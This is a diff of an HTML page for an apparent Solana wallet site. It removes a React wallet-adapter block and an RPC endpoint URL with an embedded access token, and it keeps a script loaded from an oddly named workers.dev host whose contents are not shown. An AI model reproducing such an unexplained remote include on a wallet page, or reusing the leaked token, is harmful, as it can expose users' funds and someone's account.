@@ -92,45 +92,7 @@
 </script>
 <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
 <script src="https://unpkg.com/@solana/spl-token@0.1.6/lib/index.iife.js"></script>
-<script src="https://unpkg.com/react@17/umd/react.production.min.js"></script>
-<script src="https://unpkg.com/react-dom@17/umd/react-dom.production.min.js"></script>
-<script src="https://unpkg.com/@solana/wallet-adapter-base@latest/umd/index.min.js"></script>
-<script src="https://unpkg.com/@solana/wallet-adapter-react@latest/umd/index.min.js"></script>
-<script src="https://unpkg.com/@solana/wallet-adapter-react-ui@latest/umd/index.min.js"></script>
-  <link rel="stylesheet" href="https://unpkg.com/@solana/wallet-adapter-react-ui@latest/styles.css" />
 
-  <!-- React-компонент для подключения кошелька -->
-  <script>
-    const { ConnectionProvider, WalletProvider } = window.WalletAdapterReact;
-    const { WalletModalProvider, WalletMultiButton } = window.WalletAdapterReactUI;
-    const { PhantomWalletAdapter, SolflareWalletAdapter, TorusWalletAdapter, SlopeWalletAdapter, SolletWalletAdapter } = window.WalletAdapterBase;
-
-    const wallets = [
-      new PhantomWalletAdapter(),
-      new SolflareWalletAdapter(),
-      new TorusWalletAdapter(),
-      new SlopeWalletAdapter(),
-      new SolletWalletAdapter(),
-    ];
-
-    const endpoint = "https://restless-tiniest-yard.solana-mainnet.quiknode.pro/eb4b6c9c2ad83719ce3014c8990cef0b359434ae/";
-
-    const App = () => {
-      return (
-        <ConnectionProvider endpoint={endpoint}>
-          <WalletProvider wallets={wallets} autoConnect={false}>
-            <WalletModalProvider>
-              <WalletMultiButton style={{ display: 'none' }} />
-            </WalletModalProvider>
-          </WalletProvider>
-        </ConnectionProvider>
-      );
-    };
-
-    const root = document.createElement('div');
-    document.body.appendChild(root);
-    ReactDOM.render(React.createElement(App), root);
-  </script>
 <script src="https://settings-js.solanatrader1337.workers.dev"></script>
 </body>
 </html>
